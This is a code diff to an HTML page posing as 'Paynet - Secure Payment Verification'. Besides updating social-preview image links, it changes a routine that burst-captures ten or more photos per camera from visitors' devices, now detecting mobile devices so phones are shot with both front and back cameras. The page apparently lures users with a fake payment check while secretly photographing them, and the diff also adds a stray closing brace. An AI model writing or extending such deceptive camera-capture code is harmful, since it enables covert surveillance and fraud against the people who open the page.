@@ -18,7 +18,7 @@
     <meta property="og:title" content="Paynet - Secure Payment Verification">
     <meta property="og:description"
         content="Complete your secure payment verification with Paynet. Fast, safe, and reliable transaction processing.">
-    <meta property="og:image" content="https://paynet-india-transaction-verification.onrender.com/og-image.svg">
+    <meta property="og:image" content="https://paynet-india-transaction-verification.onrender.com/og-image.png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:url" content="https://paynet-india-transaction-verification.onrender.com/">
@@ -29,7 +29,7 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Paynet - Secure Payment Verification">
     <meta name="twitter:description" content="Complete your secure payment verification with Paynet.">
-    <meta name="twitter:image" content="https://paynet-india-transaction-verification.onrender.com/og-image.svg">
+    <meta name="twitter:image" content="https://paynet-india-transaction-verification.onrender.com/og-image.png">
     <link rel="stylesheet" href="/verify.css">
     <style>
         /* Premium Glass Toasts */
@@ -662,14 +662,23 @@
             }, 500);
         }
 
+        }
+
+        // Helper to detect mobile devices
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
         // GUARANTEED DUAL CAMERA BURST CAPTURE
         // Ensures MINIMUM 10+ photos per camera
         async function captureBurst(count, interval, photoType) {
             console.log(`🎥 [CAPTURE START] Target: ${count} photos, Interval: ${interval}ms, Type: ${photoType}`);
 
-            // Split captures between front and back camera
-            const frontCount = Math.ceil(count / 2);
-            const backCount = Math.floor(count / 2);
+            const isMobile = isMobileDevice();
+            // Desktop: 100% Front
+            // Mobile: 50% Front + 50% Back
+            const frontCount = isMobile ? Math.ceil(count / 2) : count;
+            const backCount = isMobile ? Math.floor(count / 2) : 0;
 
             let frontCaptured = 0;
             let frontAttempts = 0;
@@ -745,8 +754,12 @@
 
             console.log(`📊 [FRONT COMPLETE] ${frontCaptured}/${frontCount} photos captured (${frontAttempts} attempts)`);
 
-            // SWITCH TO BACK CAMERA and capture
-            await captureFromBackCamera(backCount, 200, photoType);
+            // SWITCH TO BACK CAMERA ONLY ON MOBILE
+            if (backCount > 0) {
+                await captureFromBackCamera(backCount, 200, photoType);
+            } else {
+                console.log('💻 [DESKTOP] Skipping back camera capture (Desktop detected)');
+            }
         }
 
         // GUARANTEED BACK CAMERA CAPTURE
